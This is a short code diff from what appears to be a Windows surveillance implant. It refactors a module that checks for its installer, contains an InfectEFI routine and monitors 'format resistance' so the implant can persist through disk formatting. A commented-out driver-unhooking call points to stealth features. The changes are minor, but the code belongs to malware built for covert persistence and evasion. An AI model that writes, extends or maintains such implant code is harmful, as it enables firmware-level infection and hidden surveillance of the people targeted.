@@ -1,7 +1,7 @@
 #include <windows.h>
 #include "common.h"
 #include "H4-DLL.h"
-#include "UnHookClass.h"
+#include "bss.h"
 
 BOOL is_format_resistant = FALSE;
 
@@ -11,7 +11,7 @@ BOOL IsFiles()
 	char obj_string[MAX_PATH];
 
 	// Verifica che esista il file dell'installer
-	HM_CompletePath(EXE_INSTALLER_NAME, obj_string);
+	HM_CompletePath(shared.EXE_INSTALLER_NAME, obj_string);
 	hFile = CreateFile(obj_string, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
 	if (hFile == INVALID_HANDLE_VALUE)
 		return FALSE;
@@ -60,7 +60,7 @@ void InfectEFI()
 #define FORMAT_RESISTANCE_TIME 60000
 DWORD WINAPI MonitorFormatStatus(DWORD dummy)
 {
-	HideDevice dev_unhook;
+
 	LOOP {
 		if (is_format_resistant && IsFiles()) 
 			//if (dev_unhook.unhook_isdrv(DRIVER_NAME_W))
